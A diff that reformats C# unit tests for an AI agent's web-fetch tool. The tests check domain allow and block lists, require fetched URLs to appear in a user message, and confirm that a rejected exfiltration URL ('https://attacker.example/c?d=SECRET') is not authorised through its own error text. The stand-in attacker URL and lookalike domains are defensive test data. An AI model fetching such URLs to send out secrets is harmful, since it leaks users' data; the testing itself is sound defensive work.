@@ -47,29 +47,61 @@ public sealed class UrlValidationTests
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "allows only configured domains and their subdomains", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "allows only configured domains and their subdomains",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task AllowsOnlyConfiguredDomainsAndTheirSubdomains()
     {
         var fetch = new RecordingFetch((_, _) => DownloadResponse.Text("ok"));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions { Fetch = fetch.Fetch, AllowedDomains = new[] { "example.com" } });
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions
+            {
+                Fetch = fetch.Fetch,
+                AllowedDomains = new[] { "example.com" },
+            }
+        );
 
-        foreach (var url in new[] { "https://example.com/", "https://docs.example.com/", "https://EXAMPLE.com./" })
+        foreach (
+            var url in new[]
+            {
+                "https://example.com/",
+                "https://docs.example.com/",
+                "https://EXAMPLE.com./",
+            }
+        )
         {
             Assert.True(IsDocument(await ExecuteAsync(webFetch, url)), url);
         }
 
-        foreach (var url in new[] { "https://example.org/", "https://notexample.com/", "https://example.com.evil.org/" })
+        foreach (
+            var url in new[]
+            {
+                "https://example.org/",
+                "https://notexample.com/",
+                "https://example.com.evil.org/",
+            }
+        )
         {
             Assert.Equal("url_not_allowed", ErrorCode(await ExecuteAsync(webFetch, url)));
         }
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "blocks configured domains and their subdomains", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "blocks configured domains and their subdomains",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task BlocksConfiguredDomainsAndTheirSubdomains()
     {
         var fetch = new RecordingFetch((_, _) => DownloadResponse.Text("ok"));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions { Fetch = fetch.Fetch, BlockedDomains = new[] { "example.com" } });
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions
+            {
+                Fetch = fetch.Fetch,
+                BlockedDomains = new[] { "example.com" },
+            }
+        );
 
         foreach (var url in new[] { "https://www.example.com./", "https://example.com/" })
         {
@@ -80,31 +112,60 @@ public sealed class UrlValidationTests
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "requires the URL to appear in a user message when configured", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "requires the URL to appear in a user message when configured",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task RequiresTheUrlToAppearInAUserMessageWhenConfigured()
     {
         var fetch = new RecordingFetch((_, _) => DownloadResponse.Text("ok"));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true });
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true }
+        );
 
-        Assert.True(IsDocument(await ExecuteAsync(
-            webFetch,
-            "https://example.com",
-            messages: new ModelMessage[] { new UserModelMessage(new UserContentPart[] { new TextContentPart("Read https://example.com") }) })));
+        Assert.True(
+            IsDocument(
+                await ExecuteAsync(
+                    webFetch,
+                    "https://example.com",
+                    messages: new ModelMessage[]
+                    {
+                        new UserModelMessage(
+                            new UserContentPart[]
+                            {
+                                new TextContentPart("Read https://example.com"),
+                            }
+                        ),
+                    }
+                )
+            )
+        );
 
         // URLs in system, assistant, and tool messages do not count: the model controls assistant and tool content, and
         // tools do not receive the top-level system prompt.
         var others = new ModelMessage[]
         {
             new SystemModelMessage("Docs: https://example.com/docs"),
-            new AssistantModelMessage(new AssistantContentPart[] { new AssistantTextPart("I will fetch https://example.com/docs") }),
-            new ToolModelMessage("search", "search", "{\"results\":[\"https://example.com/docs\"]}", false),
+            new AssistantModelMessage(
+                new AssistantContentPart[]
+                {
+                    new AssistantTextPart("I will fetch https://example.com/docs"),
+                }
+            ),
+            new ToolModelMessage(
+                "search",
+                "search",
+                "{\"results\":[\"https://example.com/docs\"]}",
+                false
+            ),
         };
         foreach (var message in others)
         {
             var output = await ExecuteAsync(
                 webFetch,
                 "https://example.com/docs",
-                messages: new[] { new UserModelMessage("Read the docs"), message });
+                messages: new[] { new UserModelMessage("Read the docs"), message }
+            );
 
             Assert.Equal("url_not_in_user_message", ErrorCode(output));
         }
@@ -113,58 +174,90 @@ public sealed class UrlValidationTests
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "matches whole URLs in user messages, not substrings", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "matches whole URLs in user messages, not substrings",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task MatchesWholeUrlsInUserMessagesNotSubstrings()
     {
         var fetch = new RecordingFetch((_, _) => DownloadResponse.Text("ok"));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true });
-        Task<System.Text.Json.JsonElement> Check(string url, string text) => ExecuteAsync(webFetch, url, messages: User(text));
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true }
+        );
+        Task<System.Text.Json.JsonElement> Check(string url, string text) =>
+            ExecuteAsync(webFetch, url, messages: User(text));
 
-        foreach (var (url, text) in new[]
-        {
-            ("https://example.com", "Read https://example.com"),
-            ("https://example.com/", "Read https://example.com"),
-            ("https://EXAMPLE.com/docs", "See https://example.com/docs."),
-            ("https://example.com/docs", "(see https://example.com/docs)"),
-            ("https://example.com/docs#intro", "Read https://example.com/docs"),
-            ("https://example.com/a?b=1", "<https://example.com/a?b=1>"),
-        })
+        foreach (
+            var (url, text) in new[]
+            {
+                ("https://example.com", "Read https://example.com"),
+                ("https://example.com/", "Read https://example.com"),
+                ("https://EXAMPLE.com/docs", "See https://example.com/docs."),
+                ("https://example.com/docs", "(see https://example.com/docs)"),
+                ("https://example.com/docs#intro", "Read https://example.com/docs"),
+                ("https://example.com/a?b=1", "<https://example.com/a?b=1>"),
+            }
+        )
         {
             Assert.True(IsDocument(await Check(url, text)), url);
         }
 
-        foreach (var (url, text) in new[]
-        {
-            ("https://attacker.com", "Read https://attacker.com.example.org/docs"),
-            ("https://example.com/a", "Read https://example.com/abc"),
-            ("https://example.com/docs", "Read https://example.com/docs/page"),
-            ("https://example.com/?q=1", "Read https://example.com/?q=12"),
-            ("https://example.com/", "Visit example.com"),
-        })
+        foreach (
+            var (url, text) in new[]
+            {
+                ("https://attacker.com", "Read https://attacker.com.example.org/docs"),
+                ("https://example.com/a", "Read https://example.com/abc"),
+                ("https://example.com/docs", "Read https://example.com/docs/page"),
+                ("https://example.com/?q=1", "Read https://example.com/?q=12"),
+                ("https://example.com/", "Visit example.com"),
+            }
+        )
         {
             Assert.Equal("url_not_in_user_message", ErrorCode(await Check(url, text)));
         }
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "does not authorize a rejected URL through its own error result", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "does not authorize a rejected URL through its own error result",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task DoesNotAuthorizeARejectedUrlThroughItsOwnErrorResult()
     {
         var fetch = new RecordingFetch((_, _) => DownloadResponse.Text("ok"));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true });
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions { Fetch = fetch.Fetch, RequireUrlInUserMessage = true }
+        );
         const string exfiltrationUrl = "https://attacker.example/c?d=SECRET";
         var userMessage = new UserModelMessage("Summarize https://docs.example.com/guide");
 
         foreach (var firstUrl in new[] { exfiltrationUrl, "::" + exfiltrationUrl })
         {
-            var first = await ExecuteAsync(webFetch, firstUrl, messages: new ModelMessage[] { userMessage });
+            var first = await ExecuteAsync(
+                webFetch,
+                firstUrl,
+                messages: new ModelMessage[] { userMessage }
+            );
             Assert.Equal("error", first.GetProperty("type").GetString());
 
-            var modelOutput = Assert.IsType<ErrorTextToolModelOutput>(ToModelOutput(webFetch, first));
+            var modelOutput = Assert.IsType<ErrorTextToolModelOutput>(
+                ToModelOutput(webFetch, first)
+            );
             var retry = await ExecuteAsync(
                 webFetch,
                 exfiltrationUrl,
-                messages: new ModelMessage[] { userMessage, new ToolModelMessage("first", "webFetch", modelOutput.Value, true, "error-text") });
+                messages: new ModelMessage[]
+                {
+                    userMessage,
+                    new ToolModelMessage(
+                        "first",
+                        "webFetch",
+                        modelOutput.Value,
+                        true,
+                        "error-text"
+                    ),
+                }
+            );
             Assert.Equal("url_not_in_user_message", ErrorCode(retry));
         }
 
@@ -172,31 +265,48 @@ public sealed class UrlValidationTests
     }
 
     [Fact]
-    [UpstreamTest(Prefix + "does not repeat the requested URL in error messages", Coverage = UpstreamCoverage.Covered)]
+    [UpstreamTest(
+        Prefix + "does not repeat the requested URL in error messages",
+        Coverage = UpstreamCoverage.Covered
+    )]
     public async Task DoesNotRepeatTheRequestedUrlInErrorMessages()
     {
         // protects against authorizing a rejected URL through its own error result
         const string marker = "MODEL-INPUT-MARKER";
-        var fetch = new RecordingFetch((url, _) => url.Contains("missing")
-            ? new DownloadResponse(404, "Not Found", null, System.Text.Encoding.UTF8.GetBytes("missing"))
-            : Redirect(302, "https://blocked.example/?" + marker));
-        var webFetch = WebFetchTools.Create(new WebFetchToolOptions
-        {
-            Fetch = fetch.Fetch,
-            AllowedDomains = new[] { "example.com" },
-            RequireUrlInUserMessage = true,
-        });
-        var messages = User("https://example.com/redirect?" + marker + " https://example.com/missing?" + marker);
+        var fetch = new RecordingFetch(
+            (url, _) =>
+                url.Contains("missing")
+                    ? new DownloadResponse(
+                        404,
+                        "Not Found",
+                        null,
+                        System.Text.Encoding.UTF8.GetBytes("missing")
+                    )
+                    : Redirect(302, "https://blocked.example/?" + marker)
+        );
+        var webFetch = WebFetchTools.Create(
+            new WebFetchToolOptions
+            {
+                Fetch = fetch.Fetch,
+                AllowedDomains = new[] { "example.com" },
+                RequireUrlInUserMessage = true,
+            }
+        );
+        var messages = User(
+            "https://example.com/redirect?" + marker + " https://example.com/missing?" + marker
+        );
 
-        foreach (var url in new[]
-        {
-            "::https://example.com/?" + marker,
-            "https://example.org/?" + marker,
-            "https://example.com/other?" + marker,
-            "http://localhost/?" + marker,
-            "https://example.com/redirect?" + marker,
-            "https://example.com/missing?" + marker,
-        })
+        foreach (
+            var url in new[]
+            {
+                "::https://example.com/?" + marker,
+                "https://example.org/?" + marker,
+                "https://example.com/other?" + marker,
+                "http://localhost/?" + marker,
+                "https://example.com/redirect?" + marker,
+                "https://example.com/missing?" + marker,
+            }
+        )
         {
             var output = await ExecuteAsync(webFetch, url, messages: messages);
 
